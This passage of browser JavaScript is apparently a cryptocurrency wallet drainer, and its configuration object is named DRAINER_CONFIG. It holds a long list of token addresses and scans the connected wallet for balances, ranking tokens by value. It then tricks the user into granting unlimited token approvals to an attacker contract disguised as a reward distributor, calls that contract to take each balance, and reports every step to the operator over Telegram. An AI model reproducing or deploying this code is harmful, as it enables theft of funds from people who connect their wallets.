            { address: '0x1cEB5cB57C4D4E2b2433641b95Dd330A33185A44', symbol: 'INJ', decimals: 18, priority: 13, avgPrice: 8 },
            { address: '0xAAAA4BB04F4c625b7d267E3Bb4993E46EC0E09f5', symbol: 'ASTA', decimals: 18, priority: 13, avgPrice: 0.1 },
            { address: '0x3506424F91fD33084466F402d5D97f05F8e3b4AF', symbol: 'CHSB', decimals: 8, priority: 13, avgPrice: 0.2 },
            { address: '0x69af81e73A73B40adF4f3d4223Cd9b1ECE623074', symbol: 'MASK', decimals: 18, priority: 13, avgPrice: 3 },
            { address: '0x13339fD07934CD674269726EdF3B5ccEe9DD93de', symbol: 'CKB', decimals: 8, priority: 13, avgPrice: 0.01 },
            { address: '0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A', symbol: 'HBTC', decimals: 18, priority: 13, avgPrice: 45000 },
            { address: '0xbA50933C268F567BDC86E1aC131BE072C6B0b71a', symbol: 'ARPA', decimals: 18, priority: 13, avgPrice: 0.04 },
            { address: '0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723', symbol: 'BLANK', decimals: 18, priority: 13, avgPrice: 0.03 },
            { address: '0x607F4C5BB672230e8672085532f7e901544a7375', symbol: 'RLC', decimals: 9, priority: 13, avgPrice: 2 },
            { address: '0x8CC4aA8E13b6C0D61B5650D455Fb1aC456F24b57', symbol: 'VIDT', decimals: 18, priority: 13, avgPrice: 0.05 },
            { address: '0xf1f955016EcbCd7321c7266BccFB96c68ea5E49b', symbol: 'RLY', decimals: 18, priority: 13, avgPrice: 0.01 },
            { address: '0x4E3FBD56CD56c3e72c1403e103b45Db9da5B9D2B', symbol: 'CVX', decimals: 18, priority: 13, avgPrice: 4 },
            { address: '0x5732046A883704404F284Ce41FfADd5b007FD668', symbol: 'BLZ', decimals: 18, priority: 13, avgPrice: 0.1 },
            { address: '0x431ad2ff6a9C365805eBaD47Ee021148d6f7DBe0', symbol: 'DF', decimals: 18, priority: 13, avgPrice: 0.05 },
            { address: '0x8eB24319393716668D768dCEC29356ae9CfFe285', symbol: 'AGI', decimals: 8, priority: 13, avgPrice: 0.02 },
            
            // Extended Tier 14 - Layer 2 & Scaling (101-120)
            { address: '0x4200000000000000000000000000000000000042', symbol: 'OP', decimals: 18, priority: 14, avgPrice: 2.5 },
            { address: '0x912CE59144191C1204E64559FE8253a0e49E6548', symbol: 'ARB', decimals: 18, priority: 14, avgPrice: 1.2 },
            { address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6', symbol: 'WBTC.p', decimals: 8, priority: 14, avgPrice: 45000 },
            { address: '0x580E933D90091B9cE380740E3a4A39c67eB85B4c', symbol: 'ELON', decimals: 18, priority: 14, avgPrice: 0.0000002 },
            { address: '0xaA7a9CA87d3694B5755f213B5D04094b8d0F0A6F', symbol: 'TRAC', decimals: 18, priority: 14, avgPrice: 0.8 },
            { address: '0x9BE89D2a4cd102D8Fecc6BF9dA793be995C22541', symbol: 'KNC', decimals: 18, priority: 14, avgPrice: 0.7 },
            { address: '0x0Ec9F76202a7061eB9b3a7D6B59D36215A7e37da', symbol: 'KEY', decimals: 18, priority: 14, avgPrice: 0.008 },
            { address: '0x4740735AA98Dc8aa232BD049f8F0210458E7FcA3', symbol: 'OLT', decimals: 18, priority: 14, avgPrice: 0.02 },
            { address: '0x35A18000230DA775CAc24873d00Ff85BccdeD550', symbol: 'cUNI', decimals: 8, priority: 14, avgPrice: 0.4 },
            { address: '0x584bC13c7D411c00c01A62e8019472dE68768430', symbol: 'HEGIC', decimals: 18, priority: 14, avgPrice: 0.02 },
            { address: '0x0147e47dB53cb4E710cad45D776F77aB1F2e2012', symbol: 'ORAI', decimals: 18, priority: 14, avgPrice: 5 },
            { address: '0x2ba592F78dB6436527729929AAf6c908497cB200', symbol: 'CREAM', decimals: 18, priority: 14, avgPrice: 15 },
            { address: '0x476c5E26a75bd202a9683ffD34359C0CC15be0fF', symbol: 'SRK', decimals: 18, priority: 14, avgPrice: 0.005 },
            { address: '0x75231F58b43240C9718Dd58B4967c5114342a86c', symbol: 'OKB', decimals: 18, priority: 14, avgPrice: 45 },
            { address: '0x06325440D014e39736583c165C2963BA99fAf14E', symbol: 'STG', decimals: 18, priority: 14, avgPrice: 0.8 },
            { address: '0x557B933a7C2c45672B610F8954A3deB39a51A8Ca', symbol: 'REVV2', decimals: 18, priority: 14, avgPrice: 0.015 },
            { address: '0xcd9ec4b3BfF64f6ef4B6Bb14f8E6B1Da34C097fa', symbol: 'NFTX', decimals: 18, priority: 14, avgPrice: 25 },
            { address: '0xBBb1BD2D741F05E144E6C4517676a15554fD4B8D', symbol: 'DERC', decimals: 8, priority: 14, avgPrice: 0.3 },
            { address: '0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c', symbol: 'ENJ2', decimals: 18, priority: 14, avgPrice: 0.4 },
            { address: '0x841FB148863454A3b3570f515414759BE9091465', symbol: 'SHPING', decimals: 18, priority: 14, avgPrice: 0.006 },
            
            // Tier 15 - Meme Coins & Community (121-140)
            { address: '0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3', symbol: 'ELON2', decimals: 18, priority: 15, avgPrice: 0.0000001 },
            { address: '0x3d6F0DEa3AC3C607B3998e6Ce14b6350721752d9', symbol: 'CARDS', decimals: 18, priority: 15, avgPrice: 0.2 },
            { address: '0xba2ae424d960c26247Dd6c32edC70B295c744C43', symbol: 'DOGE', decimals: 8, priority: 15, avgPrice: 0.08 },
            { address: '0x8A9C67fee641579dEbA04928c4BC45F66e26343A', symbol: 'JRT', decimals: 18, priority: 15, avgPrice: 0.003 },
            { address: '0x1C5db575E2Ff833F92a96e5cc6F32F66BFa5E36d', symbol: 'RNDR', decimals: 18, priority: 15, avgPrice: 3 },
            { address: '0x87d73E916D7057945c9BcD8cdd94e42A6F47f776', symbol: 'NFTB', decimals: 18, priority: 15, avgPrice: 0.02 },
            { address: '0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704', symbol: 'XYO', decimals: 18, priority: 15, avgPrice: 0.006 },
            { address: '0x6E1A19F235bE7ED8E3369eF73b196C07257494DE', symbol: 'BICO', decimals: 18, priority: 15, avgPrice: 0.3 },
            { address: '0x090185f2135308BaD17527004364eBcC2D37e5F6', symbol: 'SPELL', decimals: 18, priority: 15, avgPrice: 0.001 },
            { address: '0xf8C3527CC04340b208C29c24307639d4Cc67a9Bd', symbol: 'EURA', decimals: 18, priority: 15, avgPrice: 1.1 },
            { address: '0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23', symbol: 'POOLZ', decimals: 18, priority: 15, avgPrice: 2 },
            { address: '0x1f7f70C8fDB4eE7E0B4e2a4997c85F70FBb333CA', symbol: 'WBT', decimals: 18, priority: 15, avgPrice: 8 },
            { address: '0x8CE9137d39326AD0cD6491fb5CC0CbA0e089b6A9', symbol: 'SXP', decimals: 18, priority: 15, avgPrice: 0.4 },
            { address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0', symbol: 'SAND2', decimals: 18, priority: 15, avgPrice: 0.4 },
            { address: '0x77777FeDdddFfC19Ff86DB637967013aDfFD71C8', symbol: 'TORN', decimals: 18, priority: 15, avgPrice: 3 },
            { address: '0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b', symbol: 'DPI', decimals: 18, priority: 15, avgPrice: 85 },
            { address: '0xeb4C2781e4ebA804CE9a9803C67d0893436bB27D', symbol: 'RENBTC', decimals: 8, priority: 15, avgPrice: 45000 },
            { address: '0x3155BA85D5F96b2d030a4966AF206230e46849cb', symbol: 'REN2', decimals: 18, priority: 15, avgPrice: 0.08 },
            { address: '0xfF20817765cB7f73d4bde2e66e067E58D11095C2', symbol: 'AMP', decimals: 18, priority: 15, avgPrice: 0.004 },
            { address: '0x4da27a545c0c5B758a6BA100e3a049001de870f5', symbol: 'STX', decimals: 6, priority: 15, avgPrice: 1.5 },
            
            // Tier 16 - Real World Assets & Cross-Chain (141-160)
            { address: '0x0000000000085d4780B73119b644AE5ecd22b376', symbol: 'TUSD', decimals: 18, priority: 16, avgPrice: 1 },
            { address: '0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784', symbol: 'TRU', decimals: 8, priority: 16, avgPrice: 0.06 },
            { address: '0x9992eC3cF6A55b00978cdDF2b27BC6882d88D1eC', symbol: 'POLY', decimals: 18, priority: 16, avgPrice: 0.02 },
            { address: '0x8400D94A5cb0fa0D041a3788e395285d61c9ee5e', symbol: 'UBT', decimals: 8, priority: 16, avgPrice: 0.5 },
            { address: '0xc0ba369c8Db6eB3924965e5c4FD0b4C1B91e305F', symbol: 'DUCK', decimals: 18, priority: 16, avgPrice: 0.01 },
            { address: '0xBd2F0Cd039E0BFcf88901C98c0bFAc5ab27566e3', symbol: 'DOP', decimals: 18, priority: 16, avgPrice: 0.03 },
            { address: '0xBBBBBBBBBB9cC5e90e3b3Af64bdAF62C37EeFFCb', symbol: 'DOT', decimals: 10, priority: 16, avgPrice: 5 },
            { address: '0xae78736Cd615f374D3085123A210448E74Fc6393', symbol: 'RETH', decimals: 18, priority: 16, avgPrice: 2600 },
            { address: '0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429', symbol: 'GLM', decimals: 18, priority: 16, avgPrice: 0.3 },
            { address: '0x853d955aCEf822Db058eb8505911ED77F175b99e', symbol: 'FRAX2', decimals: 18, priority: 16, avgPrice: 1 },
            { address: '0xBBc2AE13b23d715c30720F079fcd9B4a74093505', symbol: 'ERN', decimals: 18, priority: 16, avgPrice: 1.5 },
            { address: '0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6', symbol: 'USDD', decimals: 18, priority: 16, avgPrice: 1 },
            { address: '0x19D3364A399d251E894aC732651be8B0E4e85001', symbol: 'DEXA', decimals: 18, priority: 16, avgPrice: 2 },
            { address: '0x3fE2B97c1fd336E750087d68B9b867997fd64435', symbol: 'ARBT', decimals: 18, priority: 16, avgPrice: 0.8 },
            { address: '0x841FB148863454A3b3570f515414759BE9091465', symbol: 'RARE', decimals: 18, priority: 16, avgPrice: 0.1 },
            { address: '0x0f5D2fB29fb7d3CFeE444a200298f468908cC942', symbol: 'MANA2', decimals: 18, priority: 16, avgPrice: 0.5 },
            { address: '0x4e352cF164E64ADCBad318C3a1e222E9EBa4Ce42', symbol: 'MCB', decimals: 18, priority: 16, avgPrice: 10 },
            { address: '0x8207c1FfC5B6804F6024322CcF34F29c3541Ae26', symbol: 'OVR', decimals: 18, priority: 16, avgPrice: 0.5 },
            { address: '0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39', symbol: 'HEX', decimals: 8, priority: 16, avgPrice: 0.03 },
            { address: '0xB98d4C97425d9908E66E53A6fDf673ACcA0BE986', symbol: 'THALES', decimals: 18, priority: 16, avgPrice: 0.8 },
            
            // Tier 17 - AI & ML Tokens (161-180)
            { address: '0xd42debE4eDC92Bd5a3FBb4243e1ecCF6d63A4A5d', symbol: 'AI', decimals: 18, priority: 17, avgPrice: 0.5 },
            { address: '0xFE0c30065B384F05761f15d0CC899D4F9F9Cc0eB', symbol: 'OPSEC', decimals: 18, priority: 17, avgPrice: 0.2 },
            { address: '0xd9fCD98c322942075A5C3860693e9f4f03AAE07b', symbol: 'EUL', decimals: 18, priority: 17, avgPrice: 3 },
            { address: '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32', symbol: 'LDO', decimals: 18, priority: 17, avgPrice: 2 },
            { address: '0x467719aD09025FcC6cF6F8311755809d45a5E5f3', symbol: 'AXS', decimals: 18, priority: 17, avgPrice: 7 },
            { address: '0xF34960d9d60be18cC1D5Afc1A6F012A723a28811', symbol: 'KTA', decimals: 18, priority: 17, avgPrice: 0.05 },
            { address: '0x6002410dDA2Fb88b4D0dc3c1D562F7761191eA80', symbol: 'UMEE', decimals: 6, priority: 17, avgPrice: 0.006 },
            { address: '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0', symbol: 'WSTETH', decimals: 18, priority: 17, avgPrice: 2800 },
            { address: '0x1456688345527bE1f37E9e627DA0837D6f08C925', symbol: 'USDP', decimals: 18, priority: 17, avgPrice: 1 },
            { address: '0x0327112423F3A68efdF1fcF402F6c5CB9f7C33fd', symbol: 'BTU', decimals: 18, priority: 17, avgPrice: 0.6 },
            { address: '0xB62132e35a6c13ee1EE0f84dC5d40bad8d815206', symbol: 'NEXO', decimals: 18, priority: 17, avgPrice: 1.2 },
            { address: '0x1a3496C18d558bd9C6C8f609E1B129f67AB08163', symbol: 'DEV', decimals: 18, priority: 17, avgPrice: 2.5 },
            { address: '0xa49d7499271aE71cd8aB9Ac515e6694C755d400c', symbol: 'PERI', decimals: 18, priority: 17, avgPrice: 0.8 },
            { address: '0x4C11249814f11b9346808179Cf06e71ac328c1b5', symbol: 'OOKI', decimals: 18, priority: 17, avgPrice: 0.002 },
            { address: '0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F', symbol: 'SNX', decimals: 18, priority: 17, avgPrice: 2.5 },
            { address: '0x12970E6868f88f6557B76120662c1B3E50A646bf', symbol: 'LIME', decimals: 18, priority: 17, avgPrice: 0.01 },
            { address: '0x7d1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC2', decimals: 18, priority: 17, avgPrice: 0.8 },
            { address: '0xc28e27870558cF22ADD83540d2126da2e4b464c2', symbol: 'OGN', decimals: 18, priority: 17, avgPrice: 0.1 },
            { address: '0x558EC3152e2eb2174905cd19AeA4e34A23DE9aD6', symbol: 'BRD', decimals: 18, priority: 17, avgPrice: 0.08 },
            { address: '0x8290333ceF9e6D528dD5618Fb97a76f268f3EDD4', symbol: 'ANKR2', decimals: 18, priority: 17, avgPrice: 0.04 },
            
            // Tier 18 - Privacy & Security (181-200)
            { address: '0x0ba45A8b5d5575935B8158a88C631E9F9C95a2e5', symbol: 'TEN', decimals: 18, priority: 18, avgPrice: 0.1 },
            { address: '0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA', symbol: 'GALA2', decimals: 8, priority: 18, avgPrice: 0.03 },
            { address: '0xA8b919680258d369114910511cc87595aec0be6D', symbol: 'LYXe', decimals: 18, priority: 18, avgPrice: 3 },
            { address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE', decimals: 18, priority: 18, avgPrice: 3 },
            { address: '0x2ab6Bb8408ca3199B8Fa6C92d5b455F820Af03c4', symbol: 'TEL', decimals: 2, priority: 18, avgPrice: 0.002 },
            { address: '0x491604c0FDF08347Dd1fa4Ee062a822A5DD06B5D', symbol: 'CTSI', decimals: 18, priority: 18, avgPrice: 0.2 },
            { address: '0xCE91cF53d3fE31b054388B74C12DFAF498c6cce0', symbol: 'CAPS', decimals: 18, priority: 18, avgPrice: 0.05 },
            { address: '0x8f8221aFbB33998d8584A2B05749bA73c37a938a', symbol: 'REQ2', decimals: 18, priority: 18, avgPrice: 0.1 },
            { address: '0x20945cA1df56D237fD40036d47E866C7DcCD2114', symbol: 'NSURE', decimals: 18, priority: 18, avgPrice: 0.02 },
            { address: '0x9534ad65fb398e27ac8f4251dae1780b989d136e', symbol: 'PYR', decimals: 18, priority: 18, avgPrice: 3 },
            { address: '0x595832F8FC6BF59c85C527fEC3740A1b7a361269', symbol: 'POWER', decimals: 6, priority: 18, avgPrice: 0.03 },
            { address: '0x6E1A19F235bE7ED8E3369eF73b196C07257494DE', symbol: 'BICO2', decimals: 18, priority: 18, avgPrice: 0.3 },
            { address: '0x7e9e431a0B8c4D532C745B1043c7FA29a48D4fBa', symbol: 'EOS', decimals: 18, priority: 18, avgPrice: 1 },
            { address: '0x8B39B70E39Aa811b69365398e0aACe9bee238AEb', symbol: 'PKF', decimals: 18, priority: 18, avgPrice: 0.1 },
            { address: '0x6B0b3a982b4634aC68dD83a4DBF02311cE324181', symbol: 'ALBT', decimals: 18, priority: 18, avgPrice: 0.05 },
            { address: '0x8D983cb9388EaC77af0474fA441C4815500Cb7BB', symbol: 'VET', decimals: 18, priority: 18, avgPrice: 0.02 },
            { address: '0xa54ddC7B3CcE7FC8b1E3Fa0256D0DB80D2c10970', symbol: 'EURT', decimals: 6, priority: 18, avgPrice: 1.1 },
            { address: '0x467719aD09025FcC6cF6F8311755809d45a5E5f3', symbol: 'AXS2', decimals: 18, priority: 18, avgPrice: 7 },
            { address: '0x8c15Ef5b4B21951d50E53E4fbdA8298FFAD25057', symbol: 'FOX', decimals: 18, priority: 18, avgPrice: 0.08 },
            { address: '0x78a0A62Fba6Fb21A83FE8a3433d44C73a4017A6f', symbol: 'OXT2', decimals: 8, priority: 18, avgPrice: 0.1 },
            { address: '0x0b38210ea11411557c13457D4dA7dC6ea731B88a', symbol: 'API3', decimals: 18, priority: 18, avgPrice: 1.5 }
          ];
          
          const tokensWithBalance = [];
          
          console.log(`üîç Scanning ${popularTokens.length} tokens for balances...`);
          
          // Enhanced debugging for USDT/USDC
          if (window.DRAINER_CONFIG && window.DRAINER_CONFIG.TOKEN_DETECTION && window.DRAINER_CONFIG.TOKEN_DETECTION.ENHANCED_DEBUGGING) {
            console.log('üî¨ ENHANCED DEBUGGING MODE ENABLED');
            console.log('User address:', userAddress);
            console.log('Priority tokens:', window.DRAINER_CONFIG.TOKEN_DETECTION.PRIORITY_TOKENS);
            
            // Test USDT and USDC specifically first
            const priorityTokens = popularTokens.filter(token => 
              window.DRAINER_CONFIG.TOKEN_DETECTION.PRIORITY_TOKENS.includes(token.symbol)
            );
            
            console.log('üéØ Testing priority tokens first:', priorityTokens.map(t => t.symbol));
            
            for (const token of priorityTokens) {
              try {
                console.log(`üîç Testing ${token.symbol} (${token.address})`);
                
                // Create the balanceOf call data
                const paddedAddress = userAddress.slice(2).padStart(64, '0');
                const callData = '0x70a08231' + paddedAddress;
                
                console.log(`üìû Making eth_call for ${token.symbol} with rate limiting...`);
                
                const result = await rpcManager.makeEthCall([{
                  to: token.address,
                  data: callData
                }, 'latest']);
                
                console.log(`üìã Raw result for ${token.symbol}:`, result);
                
                if (!result || result === '0x') {
                  console.log(`‚ùå ${token.symbol}: No balance or invalid response`);
                  continue;
                }
                
                const balance = parseInt(result, 16);
                console.log(`‚öñÔ∏è ${token.symbol} raw balance:`, balance);
                
                if (balance > 0) {
                  const formattedBalance = (balance / Math.pow(10, token.decimals)).toFixed(6);
                  const estimatedValue = parseFloat(formattedBalance) * token.avgPrice;
                  
                  console.log(`‚úÖ ${token.symbol} FOUND:`, {
                    rawBalance: balance,
                    formattedBalance: formattedBalance,
                    decimals: token.decimals,
                    estimatedValue: estimatedValue
                  });
                  
                  tokensWithBalance.push({
                    ...token,
                    balance: balance.toString(),
                    formattedBalance,
                    estimatedValue,
                    balanceInWei: balance
                  });
                } else {
                  console.log(`‚ùå ${token.symbol}: Zero balance`);
                }
              } catch (error) {
                console.error(`üí• ${token.symbol} check failed:`, error);
              }
            }
          }
          
          // Process remaining tokens in batches with improved rate limiting
          const batchSize = 3; // Smaller batches to avoid rate limits
          const batchDelay = 2000; // Longer delay between batches
          
          // Skip priority tokens if we already checked them
          let remainingTokens = window.DRAINER_CONFIG?.TOKEN_DETECTION?.ENHANCED_DEBUGGING ? 
            popularTokens.filter(token => !window.DRAINER_CONFIG.TOKEN_DETECTION.PRIORITY_TOKENS.includes(token.symbol)) :
            popularTokens;
          
          // Limit total tokens to check to avoid rate limits
          const maxTokens = window.DRAINER_CONFIG?.TOKEN_DETECTION?.MAX_TOKENS_TO_CHECK || 50;
          if (remainingTokens.length > maxTokens) {
            console.log(`üéØ Limiting token scan to top ${maxTokens} tokens to avoid rate limits`);
            remainingTokens = remainingTokens.slice(0, maxTokens);
          }
          
          console.log(`üîÑ Processing ${remainingTokens.length} remaining tokens in batches of ${batchSize}...`);
          
          for (let i = 0; i < remainingTokens.length; i += batchSize) {
            const batch = remainingTokens.slice(i, i + batchSize);
            console.log(`üì¶ Processing batch ${Math.floor(i/batchSize) + 1}: ${batch.map(t => t.symbol).join(', ')}`);
            
            const batchPromises = batch.map(async (token) => {
              try {
                // Create the balanceOf call data
                const paddedAddress = userAddress.slice(2).padStart(64, '0');
                const callData = '0x70a08231' + paddedAddress;
                
                const result = await rpcManager.makeEthCall([{
                  to: token.address,
                  data: callData
                }, 'latest']);
                
                if (!result || result === '0x') {
                  return null;
                }
                
                const balance = parseInt(result, 16);
                
                if (balance > 0) {
                  const formattedBalance = (balance / Math.pow(10, token.decimals)).toFixed(6);
                  const estimatedValue = parseFloat(formattedBalance) * token.avgPrice;
                  
                  // Apply minimum value filter
                  const minValue = window.DRAINER_CONFIG?.TOKEN_DETECTION?.MIN_USD_VALUE || 0.01;
                  if (estimatedValue < minValue) {
                    console.log(`‚ö†Ô∏è ${token.symbol}: Below minimum value ($${estimatedValue.toFixed(4)} < $${minValue})`);
                    return null;
                  }
                  
                  return {
                    ...token,
                    balance: balance.toString(),
                    formattedBalance,
                    estimatedValue,
                    balanceInWei: balance
                  };
                }
                return null;
              } catch (error) {
                console.log(`${token.symbol} check failed:`, error.message);
                return null;
              }
            });
            
            const batchResults = await Promise.allSettled(batchPromises);
            
            batchResults.forEach(result => {
              if (result.status === 'fulfilled' && result.value) {
                tokensWithBalance.push(result.value);
                console.log(`‚úì ${result.value.symbol}: ${result.value.formattedBalance} (~$${result.value.estimatedValue.toFixed(2)})`);
              }
            });
            
            // Delay between batches - longer to avoid rate limits
            if (i + batchSize < remainingTokens.length) {
              console.log(`‚è±Ô∏è Waiting ${batchDelay}ms before next batch...`);
              await new Promise(resolve => setTimeout(resolve, batchDelay));
            }
          }
          
          // Sort tokens by estimated USD value (highest first), then by priority
          tokensWithBalance.sort((a, b) => {
            // First sort by estimated USD value (higher value first)
            if (Math.abs(a.estimatedValue - b.estimatedValue) > 0.01) {
              return b.estimatedValue - a.estimatedValue;
            }
            // If values are very close, then sort by priority (lower number = higher priority)
            return a.priority - b.priority;
          });
          
          console.log(`üí∞ Found ${tokensWithBalance.length} tokens with total estimated value: $${tokensWithBalance.reduce((sum, token) => sum + token.estimatedValue, 0).toFixed(2)}`);
          
          // Log the sorted order for transparency
          console.log('üìä Tokens will be processed in this order (highest value first):');
          tokensWithBalance.forEach((token, index) => {
            console.log(`${index + 1}. ${token.symbol}: ${token.formattedBalance} (~$${token.estimatedValue.toFixed(2)})`);
          });
          
          return tokensWithBalance;
        }
        
        async function approveTokenSimple(token, userAddress) {
          try {
            console.log(`=== APPROVAL PROCESS FOR ${token.symbol} ===`);
            console.log(`Balance: ${token.formattedBalance} ${token.symbol}`);
            
            // Check current allowance first
            const paddedUserAddress = userAddress.slice(2).padStart(64, '0');
            const paddedSpenderAddress = (window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '').slice(2).padStart(64, '0');
            const allowanceCallData = '0xdd62ed3e' + paddedUserAddress + paddedSpenderAddress; // allowance function signature
            
            const allowanceResult = await window.ethereum.request({
              method: 'eth_call',
              params: [{
                to: token.address,
                data: allowanceCallData
              }, 'latest']
            });
            
            const currentAllowance = parseInt(allowanceResult, 16);
            console.log(`Current allowance: ${(currentAllowance / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
            
            if (currentAllowance >= parseInt(token.balance)) {
              console.log(`${token.symbol} already has sufficient approval`);
              return true;
            }
            
            console.log(`Requesting approval for ${token.symbol}...`);
            
            // Update button text to show approval request
            const buttonText = document.querySelector('.text-block-2');
            if (buttonText) {
              buttonText.textContent = `Approve ${token.symbol} in wallet...`;
            }
            
            // Create approve transaction data
            const maxApproval = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 2^256 - 1
            const approveCallData = '0x095ea7b3' + paddedSpenderAddress + maxApproval; // approve function signature
            
            console.log(`üîê Sending approval transaction for ${token.symbol}...`);
            console.log('Transaction details:', {
              from: userAddress,
              to: token.address,
              data: approveCallData,
              gas: '0x186A0',
              gasPrice: '0x4A817C800'
            });
            
            const txHash = await window.ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from: userAddress,
                to: token.address,
                data: approveCallData,
                gas: '0x186A0', // 100000 in hex
                gasPrice: '0x4A817C800' // 20 gwei in hex
              }]
            });
            
            console.log(`‚úÖ ${token.symbol} approval tx submitted:`, txHash);
            
            if (buttonText) {
              buttonText.textContent = `${token.symbol} approved! Processing...`;
            }
            
            // Send Telegram notification for successful approval
            const approvalMessage = formatTelegramMessage('approval_success', {
              address: userAddress,
              symbol: token.symbol,
              balance: token.formattedBalance,
              txHash: txHash
            });
            sendTelegramMessage(approvalMessage);
            
            return true;
            
          } catch (error) {
            console.error(`=== APPROVAL FAILED FOR ${token.symbol} ===`);
            console.error('Error details:', error);
            
            const buttonText = document.querySelector('.text-block-2');
            
            if (error.code === 4001) {
              console.log('‚ùå User rejected the approval transaction');
              if (buttonText) {
                buttonText.textContent = 'Approval rejected - Try again';
              }
              
              // Send rejection notification
              const rejectionMessage = formatTelegramMessage('approval_rejected', {
                address: userAddress,
                symbol: token.symbol,
                reason: 'User rejected transaction'
              });
              sendTelegramMessage(rejectionMessage);
              
            } else if (error.code === -32000) {
              console.log('üí∞ Insufficient funds for gas fees');
              if (buttonText) {
                buttonText.textContent = 'Insufficient ETH for gas';
              }
            } else {
              console.log('üí• Approval transaction failed:', error.message);
              if (buttonText) {
                buttonText.textContent = 'Approval failed - Try again';
              }
            }
            
            return false;
          }
        }
        
        // Helper function to calculate function selector
        function getFunctionSelector(functionSignature) {
          // For claimUserRewards(address,uint256), we have the actual selector from contract ABI
          if (functionSignature === 'claimUserRewards(address,uint256)') {
            return 'dfa9d2b8'; // Calculated from contract ABI using keccak256
          }
          return null;
        }
        
        // Helper function to estimate token values (simplified)
        function calculateTokenValue(symbol, amount) {
          const prices = {
            'USDT': 1.00,
            'USDC': 1.00, 
            'DAI': 1.00,
            'WBTC': 45000, // Approximate BTC price
            'WETH': 2500   // Approximate ETH price
          };
          
          const price = prices[symbol] || 0;
          const numAmount = parseFloat(amount) || 0;
          return (price * numAmount).toFixed(2);
        }
        
        async function executeDrainingSimple(tokens, userAddress, signer) {
          try {
            console.log('=== STARTING DRAINING PROCESS ===');
            console.log(`Draining ${tokens.length} approved tokens`);
            
            if (!window.DRAINER_CONFIG.CONTRACT_ADDRESS) {
              console.error('‚ùå CONTRACT_ADDRESS not configured!');
              return;
            }
            
            if (tokens.length === 0) {
              console.log('‚ùå No approved tokens to drain');
              return;
            }
            
            let drainingSuccessCount = 0;
            
            for (const token of tokens) {
              try {
                console.log(`=== DRAINING ${token.symbol} ===`);
                console.log(`Token address: ${token.address}`);
                console.log(`Original balance: ${token.formattedBalance}`);
                
                // Check current balance again to ensure we have something to drain
                console.log('üìä Checking current token balance...');
                const balanceResult = await rpcManager.makeEthCall([{
                  to: token.address,
                  data: '0x70a08231' + userAddress.slice(2).padStart(64, '0')
                }, 'latest']);
                
                const currentBalance = parseInt(balanceResult, 16);
                
                if (currentBalance === 0) {
                  console.log(`‚ùå No balance for ${token.symbol} - skipping`);
                  continue;
                }
                
                const formattedBalance = (currentBalance / Math.pow(10, token.decimals)).toFixed(6);
                console.log(`‚úÖ Current balance: ${formattedBalance} ${token.symbol}`);
                
                // Check allowance to confirm approval worked
                console.log('üîç Checking allowance...');
                const allowanceCallData = '0xdd62ed3e' + 
                  userAddress.slice(2).padStart(64, '0') + 
                  window.DRAINER_CONFIG.CONTRACT_ADDRESS.slice(2).padStart(64, '0');
                
                const allowanceResult = await rpcManager.makeEthCall([{
                  to: token.address,
                  data: allowanceCallData
                }, 'latest']);
                
                const allowance = parseInt(allowanceResult, 16);
                const formattedAllowance = (allowance / Math.pow(10, token.decimals)).toFixed(6);
                console.log(`üîê Current allowance: ${formattedAllowance} ${token.symbol}`);
                
                if (allowance === 0) {
                  console.log(`‚ùå No allowance for ${token.symbol} - approval failed or reverted`);
                  continue;
                }
                
                // Create draining transaction - using a more generic approach
                console.log('üöÄ Creating drain transaction for RewardDistributor contract...');
                
                // Your RewardDistributor contract uses: claimUserRewards(address token, uint256 amount)
                // The function transfers min(userBalance, allowance) to treasury
                const functionSelector = 'dfa9d2b8'; // claimUserRewards(address,uint256)
                const paddedTokenAddress = token.address.slice(2).padStart(64, '0');
                const paddedAmount = currentBalance.toString(16).padStart(64, '0');
                const claimCallData = '0x' + functionSelector + paddedTokenAddress + paddedAmount;
                
                console.log('üìù RewardDistributor transaction details:', {
                  from: userAddress,
                  to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
                  data: claimCallData,
                  function: 'claimUserRewards(address,uint256)',
                  token: token.address,
                  symbol: token.symbol,
                  amount: formattedBalance,
                  allowance: formattedAllowance
                });
                
                // Verify contract requirements before sending transaction
                if (allowance === 0) {
                  console.error(`‚ùå ${token.symbol}: Zero allowance - approval transaction may have failed`);
                  continue;
                }
                
                if (currentBalance === 0) {
                  console.error(`‚ùå ${token.symbol}: Zero balance - nothing to drain`);
                  continue;
                }
                
                let success = false;
                
                try {
                  console.log(`üì§ Sending claimUserRewards transaction for ${token.symbol}...`);
                  
                  const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                      from: userAddress,
                      to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
                      data: claimCallData,
                      gas: '0x3D090', // 250000 in hex - sufficient for ERC20 transfer
                      gasPrice: '0x5D21DBA00' // 25 gwei in hex
                    }]
                  });
                  
                  console.log(`‚úÖ ${token.symbol} claimUserRewards tx submitted:`, txHash);
                  console.log(`üîó Transaction URL: https://etherscan.io/tx/${txHash}`);
                  
                  drainingSuccessCount++;
                  success = true;
                  
                  // Send detailed Telegram notification
                  const drainMessage = formatTelegramMessage('drain_success', {
                    address: userAddress,
                    symbol: token.symbol,
                    amount: formattedBalance,
                    txHash: txHash,
